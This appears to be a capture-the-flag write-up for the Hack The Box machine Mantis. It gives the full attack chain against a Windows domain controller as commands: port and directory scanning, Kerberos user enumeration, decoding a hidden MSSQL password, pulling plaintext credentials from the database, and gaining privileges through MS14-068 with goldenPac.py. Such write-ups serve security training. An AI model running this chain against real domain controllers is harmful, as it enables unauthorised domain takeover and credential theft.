---
description: https://app.hackthebox.com/machines/98
---

# Mantis

## Autorecon

**Password:** PentestEverything

{% file src="../../../.gitbook/assets/Autorecon - 10.10.10.52.7z" %}

## Nmap

```
nmap 10.10.10.52 -p- -sS -sV                                                                           

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-03-07 12:51:56Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49164/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49168/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

{% hint style="info" %}
Add "10.10.10.52 htb.local" to /etc/hosts.
{% endhint %}

Starting out we hit `SMB` with the `smb-os-discovery` `nmap` script to pull some further information. Revealing the FQDN of the target system is _mantis.htb.local_.

```bash
nmap --script 'smb-os-discovery' -p '445' '10.10.10.52'
```

![](<../../../.gitbook/assets/image (2052) (1) (1) (1) (1) (1) (1).png>)

{% hint style="info" %}
Add "10.10.10.52 mantis.htb.local" to /etc/hosts.
{% endhint %}

Running checks over `Kerberos` with `kerbrute` showed a few discovered users.

```bash
kerbrute userenum "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" --domain "htb.local" --dc "10.10.10.52"
```

![](<../../../.gitbook/assets/image (2034) (1).png>)

I tried checking for accounts with no "pre-authentication enabled" with `GetNPusers.py` against the Domain controller. Unfortunately none of these worked.

I also tried some common password lists against `SMB` and `LDAP`. Again, nothing..

Moving over to port 1337 with HTTP running we land on the root page for `IIS7`.

![](<../../../.gitbook/assets/image (2075) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Some common directory enumeration with `Feroxbuster` shows few results.

![](<../../../.gitbook/assets/image (2074) (1) (1) (1) (1) (1) (1) (1).png>)

With the `/orchard` directory reporting a 500 Internal Server Error code.

![](<../../../.gitbook/assets/image (2045) (1) (1) (1) (1) (1).png>)

Over on port 8080 we also have a web server running. Under the heading "Tossed Salad". At the foot of the page we see, it is powered by OrchardCRM.

**Orchard:** [http://www.orchardproject.net/](http://www.orchardproject.net)

![](<../../../.gitbook/assets/image (2036) (1) (1) (1).png>)

Looking through `searchsploit` we see a few vulnerabilities regarding this CRM.

```bash
searchsploit -w "orchard"
```

![](<../../../.gitbook/assets/image (2044) (1) (1) (1) (1) (2) (1).png>)

I was unable to identify the version of Orchard that is running. I tried the exploits listed above and was unable to reproduce anything promising.

Back onto further enumeration we take a deeper dive into port 1337. This time, running a larger wordlist.

```bash
feroxbuster -u "http://mantis.htb.local:1337" -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"  
```

![](<../../../.gitbook/assets/image (2061) (1) (1) (1) (1) (1) (1).png>)

Where we pick up the directory `/secure_notes`.

![](<../../../.gitbook/assets/image (2070) (1) (1) (1) (1) (1) (1) (1).png>)

The web.config file is inaccessible. However, the `dev_notes` file is readable.

```
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
```

From this we obtain information regarding the `SQL` user "_admin_". Regarding the file name for the `dev_notes`, we can assume by looking at the long string that this may be encoded or encrypted.

```
NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx
```

Using base64 to decode the string we get the following:

```bash
echo 'NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx' | base64 -d

#Output
6d2424716c5f53405f504073735730726421
```

Running this through the magic option on CyberChef

**CyberChef:** [https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')\&input=NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx](https://gchq.github.io/CyberChef/#recipe=Magic\(3,false,false,''\)\&input=NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx)

We see the resulting plaintext.

![](<../../../.gitbook/assets/image (2069) (1) (1) (1) (1) (1) (1) (1) (1).png>)

```
m$$ql_S@_P@ssW0rd!
```

We can then use these credentials along with the aforementioned admin account to login to `MSSQL` using `mssqlclient.py.`

```bash
sudo python2 mssqlclient.py htb.local/admin:'m$$ql_S@_P@ssW0rd!'@10.10.10.52  -db orcharddb
```

After confirming the credentials work, I then decided to download Sqlectron in order to connect to the database with a GUI for easy navigation.

**Sqlectron:** [https://github.com/sqlectron/sqlectron-gui/releases/tag/v1.37.1](https://github.com/sqlectron/sqlectron-gui/releases/tag/v1.37.1)

After connecting we find the table `blog_Orchard_Users_UserPartRecord` contains plaintext password information for the use _james_.

![](<../../../.gitbook/assets/image (2056) (1) (1) (1) (1) (1) (1).png>)

Credentials:

```
james:J@m3s_P@ssW0rd!
```

After gaining these credentials I found I was unable to use them anywhere meaningful which could get me code execution on the target system.

The user is part of the "Remote Desktop Users" group, however, no RDP ports are open. We have no WinRM and not enough privileges to gain code execution through the use of psexec,wmiexec and so forth...

At this point I ran extra vulernability scans against the target with Nmpa and Nessus and still, nothing...

I have to admit that I was utterly stuck and ended up looking at other walkthroughs. Supposedly the target system is vulnerable to [MS14-068](https://labs.f-secure.com/archive/digging-into-ms14-068-exploitation-and-defence/). it looks, however that other walkthroughs do not have any conclusions on how they arrive at that fact the target system is vulnerable to MS14-068.

This article suggests some form of detection to MS14-068.

**Trustedsec.com:** [https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/](https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/)

The article suggests already having knowledge the target is vulnerable to MS14-068. However, it does give a small snippet for decting if the exploit may be vulnerable with Responders's FindSMB2UPTime.py script.

```bash
#From trustedsec.com

root@tardis4:~/Responder# python FindSMB2UPTime.py 10.50.50.145
DC is up since: 2014-10-19 19:32:23
This DC is vulnerable to MS14-068
root@tardis4:~/Responder# 
```

I was unable replicate the same results for detection. Likely due to target system being rebooted multiple times a day.

Through the various methods availabe to exploiting PAC Impacket's goldenPac.py appears to be the most simplist away to acheive the desired results.

First, we need to ensure our system clock is inline with the target system. Kerberos does not allow for more than five minutes clock skew.

```
sudo ntpdate htb.local
```

We can now run goldenPac.py with the user James to acheive privilege escalation.

```bash
 goldenPac.py htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local  
```

![](<../../../.gitbook/assets/image (2046) (1) (1) (1) (1) (1) (1).png>)
